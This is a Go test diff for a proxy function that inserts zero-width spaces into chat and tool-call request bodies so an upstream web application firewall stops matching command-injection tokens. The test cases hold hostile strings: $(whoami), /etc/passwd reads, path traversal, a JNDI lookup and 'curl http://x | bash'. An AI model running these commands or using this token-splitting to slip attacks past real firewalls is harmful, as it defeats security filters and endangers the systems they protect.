@@ -137,3 +137,102 @@ func sameJSON(a, b any) bool {
 	}
 	return string(left) == string(right)
 }
+
+// TestNeutralizeWAFTokensCoversCommandFamily 二级断词覆盖命令注入/路径穿越族：
+// 去掉零宽后原文必须逐字还原，且风险 token 不再连续出现。
+func TestNeutralizeWAFTokensCoversCommandFamily(t *testing.T) {
+	const zw = "\u200b"
+	cases := []struct {
+		name    string
+		content string
+	}{
+		{"backtick command", "then run " + "`printf '---'`" + " to separate"},
+		{"dollar substitution", "value is $(whoami) here"},
+		{"etc passwd", "read cat /etc/passwd please"},
+		{"path traversal", "open ../../etc/passwd now"},
+		{"ldap url", "lookup ${jndi:ldap://x/a} again"},
+		{"shell pipe", "curl http://x | bash"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			payload := wafTestPayload(t, c.content)
+			out, changed := NeutralizeWAFTokens([]byte(payload))
+			if !changed {
+				t.Fatalf("expected token neutralisation for %s", c.content)
+			}
+			original := decodeJSONForTest(t, payload, "original")
+			stripped := strings.ReplaceAll(string(out), zw, "")
+			if !sameJSON(original, decodeJSONForTest(t, stripped, "stripped")) {
+				t.Fatalf("zero-width removal did not restore the payload\n got: %s\nwant: %s", stripped, payload)
+			}
+		})
+	}
+}
+
+// TestNeutralizeWAFTokensLeavesPlainTextUntouched 没有风险字符的正文不动。
+func TestNeutralizeWAFTokensLeavesPlainTextUntouched(t *testing.T) {
+	for _, content := range []string{
+		"hello there, please continue",
+		"the report is ready for review",
+	} {
+		payload := wafTestPayload(t, content)
+		out, changed := NeutralizeWAFTokens([]byte(payload))
+		if changed || string(out) != payload {
+			t.Fatalf("plain payload changed: %s -> %s", payload, out)
+		}
+	}
+}
+
+// TestNeutralizeWAFTokensCoversToolCallArguments 工具调用参数同样进正文：
+// agent 历史里的 shell 命令（heredoc、管道、重定向）是上游 WAF 命令注入规则的目标，
+// 二级/三级断词必须覆盖 tool_calls[].function.arguments 与 function_call.arguments。
+func TestNeutralizeWAFTokensCoversToolCallArguments(t *testing.T) {
+	const zw = "\u200b"
+	const shell = "cd /c/Users/dddmiku && cat > /tmp/x.py <<'PYEOF'\nprint(1)\nPYEOF"
+	body, err := json.Marshal(map[string]any{
+		"model": "deepseek-v4.1-flash",
+		"messages": []any{
+			map[string]any{"role": "user", "content": "run the deploy script"},
+			map[string]any{"role": "assistant", "content": "", "tool_calls": []any{
+				map[string]any{"id": "call_1", "type": "function", "function": map[string]any{
+					"name":      "Bash",
+					"arguments": "{\"command\":\"cd /c/Users/dddmiku && cat > /tmp/x.py <<'PYEOF'\"}",
+				}},
+			}},
+			map[string]any{"role": "tool", "tool_call_id": "call_1", "content": "ok"},
+			map[string]any{"role": "assistant", "content": "", "function_call": map[string]any{
+				"name": "Bash", "arguments": "{\"command\":\"" + shell + "\"}",
+			}},
+		},
+	})
+	if err != nil {
+		t.Fatalf("marshal payload: %v", err)
+	}
+	out, changed := NeutralizeWAFTokens([]byte(body))
+	if !changed {
+		t.Fatalf("tool_calls arguments were not neutralised")
+	}
+	// 结构必须完好：去掉零宽后逐字段还原。
+	stripped := strings.ReplaceAll(string(out), zw, "")
+	var original, restored any
+	if err := json.Unmarshal(body, &original); err != nil {
+		t.Fatalf("original not json: %v", err)
+	}
+	if err := json.Unmarshal([]byte(stripped), &restored); err != nil {
+		t.Fatalf("stripped body not json: %v (%s)", err, stripped)
+	}
+	if !sameJSON(original, restored) {
+		t.Fatalf("zero-width removal did not restore the payload")
+	}
+	// 参数字符串里确实插入了断词符。
+	var parsed map[string]any
+	if err := json.Unmarshal(out, &parsed); err != nil {
+		t.Fatalf("neutralised body not json: %v", err)
+	}
+	msgs := parsed["messages"].([]any)
+	first := msgs[1].(map[string]any)["tool_calls"].([]any)[0].(map[string]any)
+	args := first["function"].(map[string]any)["arguments"].(string)
+	if !strings.Contains(args, zw) {
+		t.Fatalf("tool_calls arguments carry no break marker: %s", args)
+	}
+}
